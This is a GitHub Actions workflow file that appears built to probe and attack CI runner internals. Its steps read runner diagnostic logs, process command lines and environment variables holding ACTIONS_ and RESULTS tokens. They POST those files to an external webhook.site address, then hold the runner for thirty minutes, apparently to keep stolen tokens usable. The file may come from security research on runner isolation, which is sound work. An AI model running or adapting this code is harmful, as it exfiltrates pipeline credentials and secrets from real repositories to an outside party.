name: cb-a-live
on:
  push: {}
  workflow_dispatch: {}
jobs:
  a:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4
      - name: make vault artifact
        run: |
          mkdir -p vault
          echo "TOPSECRET-TRUSTED-ARTIFACT-$(date -u +%s)" > vault/vault.txt
      - name: upload vault artifact
        uses: actions/upload-artifact@v4
        with:
          name: vault-TOPSECRET
          path: vault/
      - name: dump
        uses: ./.github/actions/dump
      - name: runner diag recon
        run: |
          set +e
          {
            echo "=== _diag files:"
            sudo ls -la /home/runner/_diag/ 2>/dev/null || ls -la /home/runner/_diag/
            echo "=== urls in worker logs:"
            sudo cat /home/runner/_diag/Worker_*.log 2>/dev/null | grep -oE 'https://[a-zA-Z0-9./_-]+' | sort -u
            echo "=== runner process cmdlines:"
            for p in $(pgrep -f Runner.Worker || pgrep -f Runner.Listener); do
              echo "pid $p:"; sudo cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' '; echo;
              sudo strings /proc/$p/environ 2>/dev/null | grep -E 'ACTIONS_|RESULTS' | sort -u | head -20
            done
          } > diag.txt 2>&1
          wc -c diag.txt
          curl -s -X POST https://webhook.site/153b24e0-26d3-437e-8fcc-e08c48298e2e -F "f=@diag.txt" -F "src=diag-recon"
          true
      - name: upload + hold
        run: |
          curl -s -X POST https://webhook.site/153b24e0-26d3-437e-8fcc-e08c48298e2e -F "f=@ctx-dump.txt" -F "src=live-A2"
          echo holding; sleep 1800
